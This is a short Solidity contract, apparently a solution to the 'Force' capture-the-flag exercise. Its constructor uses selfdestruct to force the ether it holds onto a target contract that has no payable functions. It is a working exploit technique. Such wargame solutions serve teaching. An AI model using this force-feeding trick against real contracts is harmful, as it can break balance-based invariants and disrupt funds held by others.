// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Force} from './Force.sol';

contract ForceHacker {
  constructor(address targetAddr) payable {
    selfdestruct(payable(targetAddr));
  }
}